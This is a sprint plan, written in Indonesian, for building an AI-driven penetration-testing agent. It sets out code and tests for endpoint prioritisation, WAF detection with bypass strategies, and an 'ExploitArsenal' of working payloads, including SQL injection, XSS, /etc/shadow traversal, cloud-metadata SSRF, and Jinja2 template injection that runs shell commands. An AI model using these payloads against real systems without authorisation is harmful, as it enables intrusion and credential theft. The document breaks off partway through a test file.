# SPRINT-18.md — Pentra AI
> **Untuk:** GitHub Copilot dengan Claude Sonnet 4.6  
> **Baca terlebih dahulu:** `CLAUDE.md` → `PROGRESS_REPORT.md` → file ini  
> **Sumber riset:** COMPETITIVE-ENHANCEMENT-2026.md + RENGINE-ADOPTION.md  
> **Status:** Sprint 1–17 selesai, 144 tests, 10 HIGH findings confirmed  
> **Tujuan:** Gabungan semua enhancement dari XBOW, ARTEMIS, TermiAgent, reNgine

---

## Kenapa Satu Dokumen Gabungan?

Sprint 18 sebelumnya terpecah di dua dokumen:
- `COMPETITIVE-ENHANCEMENT-2026.md` → teknik dari XBOW, ARTEMIS, TermiAgent, PentAGI
- `RENGINE-ADOPTION.md` → teknik dari reNgine v2.2.0

Dokumen ini menggabungkan keduanya dengan **prioritas tunggal** berdasarkan:
1. Overlap fitur (mana yang saling mendukung)
2. Effort vs impact
3. Urutan eksekusi yang tepat (dependency order)

---

## Master Prioritas Sprint 18

```
TIER 1 — Kerjakan dulu, efek langsung terlihat di E2E run berikutnya
───────────────────────────────────────────────────────────────────
18.1  GF Patterns             (reNgine)       2 jam  → endpoint prioritization
18.2  Smart Dedup             (reNgine)       1 jam  → kurangi noise
18.3  WAFProfiler             (Pentest Suite) 3 jam  → bypass WAF sebelum fuzz
18.4  ExploitArsenal          (TermiAgent)    2 jam  → proven payloads per stack
18.5  Dynamic LLM Prompts     (ARTEMIS)       2 jam  → +15% precision

TIER 2 — Setelah Tier 1 selesai dan divalidasi di E2E
───────────────────────────────────────────────────────────────────
18.6  Authenticated Scan      (reNgine)       3 jam  → unlock logic flaws
18.7  Two-stage Triage        (ARTEMIS)       3 jam  → 80%+ precision
18.8  SOAP/WSDL + XXE         (XBOW)          2 jam  → new vuln class
18.9  Concurrent Testing      (XBOW)          3 jam  → 3-5× kecepatan
18.10 Located Memory          (TermiAgent)    2 jam  → no context forgetting

TIER 3 — Long term, setelah v1.0 stabil
───────────────────────────────────────────────────────────────────
18.11 Scan Engine Presets     (reNgine)       4 jam  → user control
18.12 Subscan feature         (reNgine)       3 jam  → iterative testing
18.13 Incremental testing     (XBOW)          3 jam  → faster re-scans
18.14 Fine-tuning dataset     (xOffense)      ongoing → biggest long-term win
```

---

## Task 18.1 — GF Patterns Integration

> **Dari:** reNgine `gf_patterns` feature  
> **Estimasi:** 2 jam  
> **Impact:** Vuln hunt lebih targeted — LLM hanya test endpoint yang sudah diketahui punya vulnerability patterns

### File yang dibuat

**`packages/pentra-tools/pentra_tools/recon/gf_filter.py`**

```python
# packages/pentra-tools/pentra_tools/recon/gf_filter.py
"""
GF Pattern filter — prioritize endpoints berdasarkan known vulnerable parameter patterns.
Terinspirasi dari reNgine's gf_patterns dan tomnomnom/gf project.
Source: https://github.com/tomnomnom/gf
"""

import re
import logging
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class GFMatch:
    url: str
    matched_pattern: str
    vuln_hint: str
    priority: int   # 1=critical, 2=high, 3=medium, 4=low interest


# ── GF Pattern Registry ──────────────────────────────────────────────────────
# Patterns dikurasi dari tomnomnom/gf + reNgine + pengalaman H1 real engagements

GF_PATTERNS: dict[str, dict] = {

    # ── Priority 1: Langsung action ──────────────────────────────────────────

    "sqli_int": {
        "regex": r"[\?&](id|cat|uid|pid|sid|nid|fid|gid|tid|vid|aid|eid|num|page|sort|order|item|product|article|doc|news|post|entry)=\d+",
        "vuln_hint": "SQLi candidate — integer parameter (time-based blind likely)",
        "priority": 1,
    },
    "idor": {
        "regex": r"[\?&](id|user_id|uid|account|account_id|member_id|profile_id|order_id|doc_id|file_id|record_id|entity_id|object_id)=",
        "vuln_hint": "IDOR candidate — direct object reference",
        "priority": 1,
    },
    "lfi": {
        "regex": r"[\?&](file|path|page|template|include|doc|load|read|view|content|src|dir|folder|filename|filepath|document|serve|open)=",
        "vuln_hint": "LFI candidate — file/path parameter",
        "priority": 1,
    },
    "ssrf": {
        "regex": r"[\?&](url|uri|link|redirect|next|dest|destination|redir|redirect_url|return|returnTo|goto|target|webhook|forward|proxy|fetch|src|source|api_url|callback|imageUrl|image_url)=",
        "vuln_hint": "SSRF candidate — URL/destination parameter",
        "priority": 1,
    },
    "rce": {
        "regex": r"[\?&](cmd|command|exec|execute|run|shell|ping|host|ip|code|bash|sh|script)=",
        "vuln_hint": "RCE candidate — command execution parameter",
        "priority": 1,
    },
    "interesting_ext": {
        "regex": r"\.(bak|backup|old|orig|sql|db|conf|config|env|log|zip|tar\.gz|rar|7z|xml\.bak|json\.bak|php\.bak|asp\.bak)(\?.*)?$",
        "vuln_hint": "Backup/config file — potential data exposure or credentials",
        "priority": 1,
    },
    "jwt_in_url": {
        "regex": r"(eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})",
        "vuln_hint": "JWT token in URL — security misconfiguration, potential token theft",
        "priority": 1,
    },
    "api_key_exposed": {
        "regex": r"[\?&](api_key|apikey|access_token|secret_key|client_secret|auth_token|token|key)=[a-zA-Z0-9_\-]{16,}",
        "vuln_hint": "API key/secret in URL — exposure risk",
        "priority": 1,
    },

    # ── Priority 2: High likelihood ───────────────────────────────────────────

    "sqli_str": {
        "regex": r"[\?&](name|username|user|email|search|q|query|keyword|filter|type|status|category|tag)=[a-zA-Z%]",
        "vuln_hint": "SQLi candidate — string parameter",
        "priority": 2,
    },
    "xss": {
        "regex": r"[\?&](search|q|query|s|keyword|input|text|message|comment|feedback|error|msg|content|data|value|title|description|name|first_name|last_name)=",
        "vuln_hint": "XSS candidate — reflection parameter",
        "priority": 2,
    },
    "ssti": {
        "regex": r"[\?&](template|render|view|theme|format|lang|locale|layout|tpl|engine|output)=",
        "vuln_hint": "SSTI candidate — template parameter",
        "priority": 2,
    },
    "open_redirect": {
        "regex": r"[\?&](redirect|url|return|next|goto|destination|redir|back|forward|continue|returnUrl|return_url|next_url|redirect_uri|redirect_url)=https?",
        "vuln_hint": "Open Redirect candidate — URL parameter starting with http",
        "priority": 2,
    },
    "debug_endpoints": {
        "regex": r"/(debug|test|dev|development|staging|demo|sandbox|admin|internal|backend|api-docs|swagger|graphql|graphiql|__debug__|actuator|health|metrics|status|info)(/|$|\?)",
        "vuln_hint": "Debug/admin endpoint — likely has weaker auth or verbose errors",
        "priority": 2,
    },

    # ── Priority 3: Worth investigating ───────────────────────────────────────

    "path_traversal": {
        "regex": r"[\?&](path|dir|directory|folder|location|base|prefix|root|cwd|home|load_path)=",
        "vuln_hint": "Path traversal candidate",
        "priority": 3,
    },
    "xxe": {
        "regex": r"\.(xml|wsdl|xslt|dtd)(\?.*)?$|/(soap|wsdl|xml)(/|$|\?)",
        "vuln_hint": "XXE candidate — XML/SOAP endpoint",
        "priority": 3,
    },
    "version_disclosure": {
        "regex": r"/(v\d+|api/v\d+|rest/v\d+|v\d+\.\d+)/",
        "vuln_hint": "Versioned API — test both old and new versions for auth differences",
        "priority": 3,
    },
    "file_upload": {
        "regex": r"/(upload|uploads?|files?|attachments?|media|documents?|images?|photos?|assets?)(/|$|\?)",
        "vuln_hint": "File upload endpoint — potential unrestricted upload, path traversal",
        "priority": 3,
    },

    # ── Priority 4: Low but interesting ──────────────────────────────────────

    "oauth": {
        "regex": r"/(oauth|oauth2|auth|authorize|token|callback|login|sso|saml|openid)(/|$|\?)",
        "vuln_hint": "Auth/OAuth endpoint — test token handling, redirect_uri bypass",
        "priority": 4,
    },
    "graphql": {
        "regex": r"/(graphql|graphiql|gql|api/graphql|query)(\?.*)?$",
        "vuln_hint": "GraphQL endpoint — introspection, batching attacks, injection",
        "priority": 4,
    },
    "websocket": {
        "regex": r"ws(s?)://|/(ws|websocket|socket\.io|sockjs)(/|$)",
        "vuln_hint": "WebSocket endpoint — check WS injection, authentication",
        "priority": 4,
    },
}


def apply_gf_patterns(
    urls: list[str],
    patterns: list[str] | None = None,
    max_per_pattern: int = 20,
) -> list[GFMatch]:
    """
    Filter dan prioritize URLs berdasarkan GF patterns.

    Args:
        urls: List URLs dari crawl/recon
        patterns: Subset pattern names, atau None untuk semua
        max_per_pattern: Max URLs per pattern untuk prevent flooding

    Returns:
        List GFMatch sorted by priority (1=most critical)
    """
    patterns_to_use = {
        k: v for k, v in GF_PATTERNS.items()
        if patterns is None or k in patterns
    }

    matches: list[GFMatch] = []
    seen_urls: set[str] = set()
    per_pattern_count: dict[str, int] = {}

    for url in urls:
        if url in seen_urls:
            continue

        for pattern_name, config in patterns_to_use.items():
            if re.search(config["regex"], url, re.IGNORECASE):
                count = per_pattern_count.get(pattern_name, 0)
                if count >= max_per_pattern:
                    continue

                matches.append(GFMatch(
                    url=url,
                    matched_pattern=pattern_name,
                    vuln_hint=config["vuln_hint"],
                    priority=config["priority"],
                ))
                seen_urls.add(url)
                per_pattern_count[pattern_name] = count + 1
                break  # Satu URL ambil first match saja

    matches.sort(key=lambda m: m.priority)
    return matches


def prioritize_endpoints_for_vuln_hunt(
    endpoints: list[dict],
    max_endpoints: int = 150,
    patterns: list[str] | None = None,
) -> list[dict]:
    """
    Prioritize endpoint list untuk vuln hunt menggunakan GF patterns.
    - Endpoints dengan pattern match → di depan (sorted by priority)
    - Endpoints tanpa match → di belakang
    - Total capped di max_endpoints

    Terinspirasi dari reNgine's gf_patterns config.
    """
    urls = [ep.get("url", "") for ep in endpoints if ep.get("url")]
    gf_matches = apply_gf_patterns(urls, patterns=patterns)
    matched_url_map = {m.url: m for m in gf_matches}

    prioritized: list[dict] = []
    unmatched: list[dict] = []

    for ep in endpoints:
        url = ep.get("url", "")
        if url in matched_url_map:
            match = matched_url_map[url]
            enriched_ep = {
                **ep,
                "gf_pattern": match.matched_pattern,
                "vuln_hint": match.vuln_hint,
                "gf_priority": match.priority,
            }
            prioritized.append(enriched_ep)
        else:
            unmatched.append(ep)

    # Sort prioritized by GF priority score (1=first)
    prioritized.sort(key=lambda ep: ep.get("gf_priority", 5))

    total = prioritized + unmatched
    result = total[:max_endpoints]

    logger.info(
        "[gf_filter] %d endpoints → %d prioritized, %d unmatched (capped at %d)",
        len(endpoints),
        len(prioritized),
        len(unmatched),
        max_endpoints,
    )

    return result
```

### Tests

```python
# packages/pentra-tools/tests/test_gf_filter.py

from pentra_tools.recon.gf_filter import apply_gf_patterns, prioritize_endpoints_for_vuln_hunt


def test_sqli_pattern_matches_integer_param():
    urls = ["http://target.com/products.aspx?id=1"]
    matches = apply_gf_patterns(urls)
    assert len(matches) == 1
    assert matches[0].matched_pattern == "sqli_int"
    assert matches[0].priority == 1


def test_lfi_pattern_matches_file_param():
    urls = ["http://target.com/view?page=home"]
    matches = apply_gf_patterns(urls, patterns=["lfi"])
    assert any(m.matched_pattern == "lfi" for m in matches)


def test_ssrf_pattern_matches_url_param():
    urls = ["http://target.com/fetch?url=http://internal"]
    matches = apply_gf_patterns(urls, patterns=["ssrf"])
    assert len(matches) == 1
    assert matches[0].priority == 1


def test_backup_extension_priority_1():
    urls = ["http://target.com/config.bak", "http://target.com/db.sql"]
    matches = apply_gf_patterns(urls, patterns=["interesting_ext"])
    assert len(matches) == 2
    assert all(m.priority == 1 for m in matches)


def test_priority_ordering_critical_first():
    urls = [
        "http://t.com/search?q=test",        # xss → priority 2
        "http://t.com/products?id=1",         # sqli_int → priority 1
        "http://t.com/view?path=/etc",        # path_traversal → priority 3
    ]
    matches = apply_gf_patterns(urls)
    priorities = [m.priority for m in matches]
    assert priorities == sorted(priorities), "Should be sorted priority asc"


def test_prioritize_enriches_endpoint_with_vuln_hint():
    endpoints = [
        {"url": "http://t.com/products?id=1", "method": "GET"},
        {"url": "http://t.com/about", "method": "GET"},
    ]
    result = prioritize_endpoints_for_vuln_hunt(endpoints)
    matched = next((e for e in result if e.get("gf_pattern")), None)
    assert matched is not None
    assert matched["vuln_hint"] != ""
    assert matched["gf_priority"] == 1


def test_unmatched_endpoints_at_end():
    endpoints = [
        {"url": "http://t.com/about"},            # no match
        {"url": "http://t.com/page?id=1"},        # sqli_int match
    ]
    result = prioritize_endpoints_for_vuln_hunt(endpoints)
    assert result[0].get("gf_pattern") is not None, "Matched should be first"
    assert result[-1].get("gf_pattern") is None, "Unmatched should be last"
```

### Integrasi ke recon_node.py

```python
# packages/pentra-agent/pentra_agent/nodes/recon_node.py
# Tambahkan setelah httpx probe, sebelum return:

from pentra_tools.recon.gf_filter import prioritize_endpoints_for_vuln_hunt

# Prioritize endpoints dengan GF patterns
all_endpoints = prioritize_endpoints_for_vuln_hunt(
    all_endpoints,
    max_endpoints=150,
)

# Summary untuk LLM context
gf_matched = [ep for ep in all_endpoints if ep.get("gf_pattern")]
logger.info(
    "[recon_node] GF patterns: %d/%d endpoints have vuln hints",
    len(gf_matched), len(all_endpoints)
)
if gf_matched:
    top5 = gf_matched[:5]
    logger.info(
        "[recon_node] Top GF matches: %s",
        [(ep["url"], ep["gf_pattern"]) for ep in top5]
    )
```

---

## Task 18.2 — Smart Duplicate Removal

> **Dari:** reNgine `duplicate_fields: [content_length, page_title]`  
> **Estimasi:** 1 jam  
> **Impact:** 20-30% noise reduction pada large attack surface

```python
# packages/pentra-tools/pentra_tools/recon/dedup.py

import logging
logger = logging.getLogger(__name__)


def smart_dedup_endpoints(endpoints: list[dict]) -> list[dict]:
    """
    Smart dedup berdasarkan content_length + page_title fingerprint.
    Lebih akurat dari URL-only karena:
    /products?id=1 dan /products?id=2 yang return konten sama = 1 endpoint.

    Terinspirasi dari reNgine's duplicate_fields config.
    """
    seen: dict[str, str] = {}   # sig → first_url
    unique: list[dict] = []
    removed = 0

    for ep in endpoints:
        url = ep.get("url", "")
        content_len = ep.get("content_length")
        page_title = (ep.get("page_title") or "").strip().lower()

        # Build fingerprint
        if content_len is not None and page_title:
            sig = f"cl:{content_len}|title:{page_title[:80]}"
        elif content_len is not None:
            sig = f"cl:{content_len}"
        else:
            # Fallback: URL dedup (strip query params variasi)
            from urllib.parse import urlparse, parse_qs, urlencode
            parsed = urlparse(url)
            # Normalize: remove ID-like params yang nilainya berbeda tapi path sama
            sig = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if sig not in seen:
            seen[sig] = url
            unique.append(ep)
        else:
            removed += 1
            logger.debug("[dedup] Removed duplicate: %s ≈ %s", url, seen[sig])

    logger.info(
        "[dedup] %d → %d endpoints (removed %d duplicates, %.0f%%)",
        len(endpoints), len(unique), removed,
        (removed / max(len(endpoints), 1)) * 100,
    )
    return unique
```

**Tests:**

```python
# packages/pentra-tools/tests/test_dedup.py

from pentra_tools.recon.dedup import smart_dedup_endpoints


def test_dedup_same_content_fingerprint():
    """Dua endpoint dengan content_length + page_title sama harus di-dedup."""
    endpoints = [
        {"url": "http://t.com/products?id=1", "content_length": 1234, "page_title": "Products"},
        {"url": "http://t.com/products?id=2", "content_length": 1234, "page_title": "Products"},
    ]
    result = smart_dedup_endpoints(endpoints)
    assert len(result) == 1


def test_dedup_different_content_kept():
    """Dua endpoint dengan content berbeda harus keduanya ada."""
    endpoints = [
        {"url": "http://t.com/user/1", "content_length": 500, "page_title": "User Alice"},
        {"url": "http://t.com/user/2", "content_length": 520, "page_title": "User Bob"},
    ]
    result = smart_dedup_endpoints(endpoints)
    assert len(result) == 2


def test_dedup_no_fingerprint_url_fallback():
    """Tanpa fingerprint, fallback ke URL path dedup."""
    endpoints = [
        {"url": "http://t.com/page?id=1"},
        {"url": "http://t.com/page?id=2"},
        {"url": "http://t.com/other"},
    ]
    result = smart_dedup_endpoints(endpoints)
    # /page muncul sekali, /other sekali
    assert len(result) == 2
```

**Integrasi ke recon_node.py setelah httpx probe:**

```python
from pentra_tools.recon.dedup import smart_dedup_endpoints

# Setelah httpx probe menghasilkan all_endpoints dengan content_length + page_title:
all_endpoints = smart_dedup_endpoints(all_endpoints)
# Lalu GF filter
all_endpoints = prioritize_endpoints_for_vuln_hunt(all_endpoints, max_endpoints=150)
```

---

## Task 18.3 — WAFProfiler

> **Dari:** Pentest Agent Suite `waf-profiler` + reNgine `waf_detection`  
> **Estimasi:** 3 jam  
> **Impact:** Payloads di-encode sesuai WAF bypass strategy sebelum testing

```python
# packages/pentra-tools/pentra_tools/recon/waf_profiler.py

import asyncio
import logging
from dataclasses import dataclass, field

import httpx

logger = logging.getLogger(__name__)


@dataclass
class WAFProfile:
    url: str
    waf_detected: bool
    waf_type: str | None
    is_blocking: bool
    bypass_strategies: list[str]
    block_threshold_rps: int   # Berapa request/detik sebelum diblock
    notes: list[str] = field(default_factory=list)


WAF_FINGERPRINTS: dict[str, list[str]] = {
    "cloudflare":  ["cf-ray", "__cfduid", "cloudflare"],
    "akamai":      ["akamai", "x-check-cacheable", "x-cache-remote"],
    "imperva":     ["x-iinfo", "incap_ses", "visid_incap"],
    "f5_bigip":    ["bigipserver", "ts"],
    "barracuda":   ["bnsec", "barracuda_"],
    "sucuri":      ["x-sucuri", "sucuri-cache"],
    "modsecurity": ["mod_security", "modsecurity", "noyb"],
    "aws_waf":     ["x-amzn-requestid", "awswaf"],
    "azure_frontdoor": ["x-azure-ref", "x-ms-ref"],
    "fortiweb":    ["fortiwafsid", "cookiesession"],
}

BYPASS_STRATEGIES: dict[str, list[str]] = {
    "cloudflare":  ["unicode_bypass", "case_variation", "comment_injection", "chunked_encoding"],
    "modsecurity": ["http_param_pollution", "null_byte", "comment_bypass", "url_double_encode"],
    "akamai":      ["case_variation", "unicode_bypass", "header_injection"],
    "imperva":     ["url_encoding", "html_entity", "case_variation"],
    "generic":     ["url_double_encode", "html_entity_encode", "hex_encode", "case_variation"],
}


async def profile_waf(
    url: str,
    timeout: float = 8.0,
) -> WAFProfile:
    """
    Detect dan profile WAF pada target URL.
    Kirim 3 probe requests (normal + xss + sqli) dan analisis responses.
    """
    async with httpx.AsyncClient(
        timeout=timeout,
        follow_redirects=True,
        verify=False,
    ) as client:

        responses = {}

        # Probe 1: Normal request (baseline)
        try:
            r = await client.get(url)
            responses["baseline"] = {
                "status": r.status_code,
                "headers": dict(r.headers),
                "size": len(r.content),
            }
        except Exception as e:
            logger.debug("[waf_profiler] Baseline probe failed: %s", e)
            responses["baseline"] = {"status": 0, "headers": {}}

        # Probe 2: Classic XSS
        xss_url = url + ("&" if "?" in url else "?") + "test=<script>alert(1)</script>"
        try:
            r = await client.get(xss_url)
            responses["xss"] = {
                "status": r.status_code,
                "headers": dict(r.headers),
                "body_snippet": r.text[:200],
            }
        except Exception:
            responses["xss"] = {"status": 0, "headers": {}}

        # Probe 3: Classic SQLi
        sqli_url = url + ("&" if "?" in url else "?") + "id=1'%20OR%20'1'='1"
        try:
            r = await client.get(sqli_url)
            responses["sqli"] = {
                "status": r.status_code,
                "headers": dict(r.headers),
            }
        except Exception:
            responses["sqli"] = {"status": 0, "headers": {}}

    # ── Detect WAF type ──────────────────────────────────────────────────────
    detected_waf = None
    all_headers_str = ""
    for resp in responses.values():
        for k, v in resp.get("headers", {}).items():
            all_headers_str += f" {k.lower()}: {v.lower()}"

    for waf_name, indicators in WAF_FINGERPRINTS.items():
        if any(ind.lower() in all_headers_str for ind in indicators):
            detected_waf = waf_name
            break

    # ── Detect blocking ──────────────────────────────────────────────────────
    BLOCK_CODES = {403, 406, 418, 429, 503}
    is_blocked = (
        responses.get("xss", {}).get("status") in BLOCK_CODES or
        responses.get("sqli", {}).get("status") in BLOCK_CODES
    )

    # ── Build notes ──────────────────────────────────────────────────────────
    notes = []
    if detected_waf:
        notes.append(f"WAF detected: {detected_waf}")
    if is_blocked:
        notes.append("WAF is actively blocking attack patterns")
        notes.append("Use bypass strategies before fuzzing")
    else:
        notes.append("WAF present but not blocking test payloads (misconfigured or passive mode)")

    bypass = BYPASS_STRATEGIES.get(
        detected_waf or "generic",
        BYPASS_STRATEGIES["generic"]
    )

    profile = WAFProfile(
        url=url,
        waf_detected=detected_waf is not None,
        waf_type=detected_waf,
        is_blocking=is_blocked,
        bypass_strategies=bypass,
        block_threshold_rps=2 if is_blocked else 20,
        notes=notes,
    )

    logger.info(
        "[waf_profiler] %s → waf=%s blocking=%s bypass=%s",
        url, detected_waf or "none", is_blocked, bypass[:2]
    )

    return profile
```

**Tests:**

```python
# packages/pentra-tools/tests/test_waf_profiler.py

import pytest
from unittest.mock import AsyncMock, MagicMock, patch


@pytest.mark.asyncio
async def test_waf_detection_cloudflare():
    """Cloudflare header harus terdeteksi."""
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"cf-ray": "abc123-SIN", "content-type": "text/html"}
    mock_resp.content = b"ok"
    mock_resp.text = "ok"

    with patch("httpx.AsyncClient") as mock_cls:
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_cls.return_value = mock_client

        from pentra_tools.recon.waf_profiler import profile_waf
        result = await profile_waf("http://target.com/")

    assert result.waf_detected is True
    assert result.waf_type == "cloudflare"


@pytest.mark.asyncio
async def test_no_waf_detected():
    """Normal server tanpa WAF headers."""
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"content-type": "text/html", "server": "nginx"}
    mock_resp.content = b"ok"
    mock_resp.text = "ok"

    with patch("httpx.AsyncClient") as mock_cls:
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_cls.return_value = mock_client

        from pentra_tools.recon.waf_profiler import profile_waf
        result = await profile_waf("http://target.com/")

    assert result.waf_detected is False
    assert result.waf_type is None
```

**Integrasi ke recon_node.py:**

```python
from pentra_tools.recon.waf_profiler import profile_waf, WAFProfile

# Setelah httpx probe, sebelum ffuf/nuclei:
primary_url = f"http://{domain}/"
waf_profile: WAFProfile | None = None

try:
    waf_profile = await profile_waf(primary_url)
    if waf_profile.waf_detected:
        logger.info(
            "[recon_node] WAF detected: %s (blocking=%s) → bypass: %s",
            waf_profile.waf_type,
            waf_profile.is_blocking,
            waf_profile.bypass_strategies[:2],
        )
    else:
        logger.info("[recon_node] No WAF detected — normal scan speed")
except Exception as e:
    logger.warning("[recon_node] WAF profile failed: %s", e)

# Pass ke state untuk dipakai vuln_hunt_node
waf_info = {
    "waf_type": waf_profile.waf_type if waf_profile else None,
    "is_blocking": waf_profile.is_blocking if waf_profile else False,
    "bypass_strategies": waf_profile.bypass_strategies if waf_profile else [],
    "safe_rps": waf_profile.block_threshold_rps if waf_profile else 20,
}
```

---

## Task 18.4 — ExploitArsenal

> **Dari:** TermiAgent — structured exploit patterns, bukan naïve retrieval  
> **Estimasi:** 2 jam  
> **Impact:** Proven payloads yang sudah terbukti berhasil di engagement nyata

```python
# packages/pentra-agent/pentra_agent/arsenal/exploit_arsenal.py

"""
ExploitArsenal — proven payload templates per vuln class + tech stack.
Terinspirasi dari TermiAgent's exploit arsenal approach.
Payloads di-kurasi dari H1 confirmed findings dan pentest experience.
"""

from __future__ import annotations


class ExploitArsenal:
    """
    Structured exploit payloads yang sudah proven.
    Bukan random payload list — setiap payload ada alasan dan konteksnya.
    """

    _PAYLOADS: dict[str, dict[str, list[str]]] = {

        # ── SQL Injection ────────────────────────────────────────────────────
        "SQL_INJECTION": {
            "mssql_timebased": [
                "'; WAITFOR DELAY '0:0:5'--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "' OR 1=1; WAITFOR DELAY '0:0:5'--",
                "') OR 1=1; WAITFOR DELAY '0:0:5'--",
            ],
            "mysql_timebased": [
                "' AND SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "1 AND SLEEP(5)--",
            ],
            "postgresql_timebased": [
                "'; SELECT pg_sleep(5)--",
                "' OR 1=1; SELECT pg_sleep(5)--",
            ],
            "error_based": [
                "'",
                '"',
                "\\",
                "'--",
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "1' ORDER BY 1--",
                "1' ORDER BY 100--",   # Kolom ke-100 tidak ada → error
            ],
            "boolean": [
                "' OR '1'='1' --",
                "' OR '1'='2' --",
                "1 AND 1=1",
                "1 AND 1=2",
            ],
        },

        # ── XSS ─────────────────────────────────────────────────────────────
        "XSS": {
            "basic_script": [
                "<script>alert(1)</script>",
                "<script>alert(document.domain)</script>",
                "<ScRiPt>alert(1)</sCrIpT>",
            ],
            "attribute_injection": [
                '" onmouseover="alert(1)',
                "' onfocus='alert(1)' autofocus='",
                '" autofocus onfocus="alert(1)"',
                '"><img src=x onerror=alert(1)>',
            ],
            "html_injection": [
                "<b>PENTRA_XSS_TEST</b>",
                "<h1>XSS</h1>",
            ],
            "csp_bypass": [
                '<script src="data:,alert(1)"></script>',
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
            ],
        },

        # ── Path Traversal / LFI ─────────────────────────────────────────────
        "PATH_TRAVERSAL": {
            "linux": [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../etc/shadow",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encode
            ],
            "windows": [
                "..\\..\\..\\windows\\win.ini",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            ],
            "aspnet": [
                "../web.config",
                "..%2fweb.config",
                "....//web.config",
                "%2e%2e%2fweb.config",
                "..%252fweb.config",
            ],
            "interesting_files": [
                ".env",
                ".git/config",
                "config.php",
                "wp-config.php",
                "settings.py",
                "application.properties",
                "database.yml",
            ],
        },

        # ── SSRF ─────────────────────────────────────────────────────────────
        "SSRF": {
            "internal_probes": [
                "http://127.0.0.1/",
                "http://localhost/",
                "http://0.0.0.0/",
                "http://[::1]/",
                "http://0177.0000.0000.0001/",  # Octal bypass
            ],
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/",          # AWS
                "http://169.254.169.254/latest/meta-data/iam/",      # AWS IAM
                "http://metadata.google.internal/computeMetadata/v1/", # GCP
                "http://169.254.169.254/metadata/instance",          # Azure
            ],
            "internal_services": [
                "http://127.0.0.1:6379/",    # Redis
                "http://127.0.0.1:5432/",    # PostgreSQL
                "http://127.0.0.1:27017/",   # MongoDB
                "http://127.0.0.1:8080/",    # Internal app
                "http://127.0.0.1:9200/",    # Elasticsearch
            ],
        },

        # ── IDOR ─────────────────────────────────────────────────────────────
        "IDOR": {
            "integer_manipulation": [
                "0",
                "-1",
                "9999999",
                "1",       # Test dengan ID user/object lain
                "2",
                "100",
            ],
            "uuid_test": [
                "00000000-0000-0000-0000-000000000001",
                "00000000-0000-0000-0000-000000000002",
            ],
        },

        # ── SSTI ─────────────────────────────────────────────────────────────
        "SSTI": {
            "detection": [
                "{{7*7}}",       # 49 = Jinja2/Twig
                "${7*7}",        # 49 = Freemarker/Java
                "#{7*7}",        # 49 = Thymeleaf/Ruby
                "<%= 7*7 %>",    # 49 = ERB/EJS
                "{{7*'7'}}",     # 7777777 = Jinja2 confirmed
            ],
            "jinja2_rce": [
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.join(__import__('os').popen('id').read())}}",
            ],
        },
    }

    @classmethod
    def get_payloads(
        cls,
        vuln_class: str,
        tech_stack: list[str] | None = None,
        category: str | None = None,
    ) -> list[str]:
        """
        Return proven payloads untuk vuln class + tech stack.

        Args:
            vuln_class: e.g., "SQL_INJECTION", "XSS", "PATH_TRAVERSAL"
            tech_stack: e.g., ["ASP.NET", "IIS", "MSSQL"]
            category: spesifik sub-category, None = auto-select berdasarkan tech
        """
        class_payloads = cls._PAYLOADS.get(vuln_class.upper(), {})
        if not class_payloads:
            return []

        # Auto-select kategori berdasarkan tech stack
        if category:
            return class_payloads.get(category, [])

        tech_lower = " ".join(t.lower() for t in (tech_stack or []))
        selected: list[str] = []

        if vuln_class.upper() == "SQL_INJECTION":
            if "mssql" in tech_lower or "sqlserver" in tech_lower or "asp.net" in tech_lower:
                selected.extend(class_payloads.get("mssql_timebased", []))
            elif "mysql" in tech_lower or "mariadb" in tech_lower:
                selected.extend(class_payloads.get("mysql_timebased", []))
            elif "postgresql" in tech_lower or "postgres" in tech_lower:
                selected.extend(class_payloads.get("postgresql_timebased", []))
            # Always include error-based
            selected.extend(class_payloads.get("error_based", [])[:4])

        elif vuln_class.upper() == "PATH_TRAVERSAL":
            if "windows" in tech_lower or "iis" in tech_lower or "asp.net" in tech_lower:
                selected.extend(class_payloads.get("aspnet", []))
                selected.extend(class_payloads.get("windows", [])[:3])
            else:
                selected.extend(class_payloads.get("linux", [])[:5])
            selected.extend(class_payloads.get("interesting_files", [])[:3])

        else:
            # Default: ambil semua dari semua kategori
            for payloads in class_payloads.values():
                selected.extend(payloads[:3])

        # Deduplicate
        seen = set()
        return [p for p in selected if not (p in seen or seen.add(p))]

    @classmethod
    def get_detection_payloads(cls, vuln_class: str) -> list[str]:
        """Return minimal detection payloads saja (untuk quick check)."""
        class_payloads = cls._PAYLOADS.get(vuln_class.upper(), {})
        return (
            class_payloads.get("detection", []) or
            class_payloads.get("error_based", [])[:2] or
            list(class_payloads.values())[0][:2] if class_payloads else []
        )
```

**Tests:**

```python
# packages/pentra-agent/tests/test_exploit_arsenal.py

from pentra_agent.arsenal.exploit_arsenal import ExploitArsenal


def test_sqli_aspnet_returns_mssql_payloads():
    payloads = ExploitArsenal.get_payloads("SQL_INJECTION", ["ASP.NET", "MSSQL"])
    assert any("WAITFOR" in p for p in payloads), "MSSQL WAITFOR payload must exist"
    assert len(payloads) > 0


def test_sqli_mysql_returns_sleep_payloads():
